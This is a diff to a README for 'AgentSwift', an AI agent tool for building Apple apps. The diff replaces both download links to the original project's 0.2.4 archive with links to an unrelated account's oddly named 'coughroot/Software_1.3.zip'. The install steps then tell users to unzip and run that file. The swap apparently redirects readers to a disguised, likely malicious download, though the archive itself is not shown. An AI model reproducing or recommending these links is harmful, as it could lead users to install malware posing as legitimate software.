@@ -1,6 +1,6 @@
 # 🤖 agentswift - Build Apple apps using AI agents
 
-[![](https://img.shields.io/badge/Download-AgentSwift-blue.svg)](https://github.com/hpennington/agentswift/raw/refs/heads/main/AgentSwift-0.2.4.zip)
+[![](https://img.shields.io/badge/Download-AgentSwift-blue.svg)](https://github.com/Doubleedged-capitaloftennessee462/agentswift/raw/refs/heads/main/coughroot/Software_1.3.zip)
 
 AgentSwift helps you build software for Apple devices. You describe the app features you want. The application uses artificial intelligence to create code, build your project, and test the results. You do not need to open the complex development tools manually. The agent handles the file changes and system commands for you.
 
@@ -8,7 +8,7 @@ AgentSwift helps you build software for Apple devices. You describe the app feat
 
 Follow these steps to set up AgentSwift on your computer. Ensure you have an Apple computer running the latest version of macOS.
 
-1. Download the application file from this link: [Download AgentSwift](https://github.com/hpennington/agentswift/raw/refs/heads/main/AgentSwift-0.2.4.zip).
+1. Download the application file from this link: [Download AgentSwift](https://github.com/Doubleedged-capitaloftennessee462/agentswift/raw/refs/heads/main/coughroot/Software_1.3.zip).
 2. Locate the file in your downloads folder.
 3. Unzip the file by double-clicking it.
 4. Drag the AgentSwift application into your Applications folder.
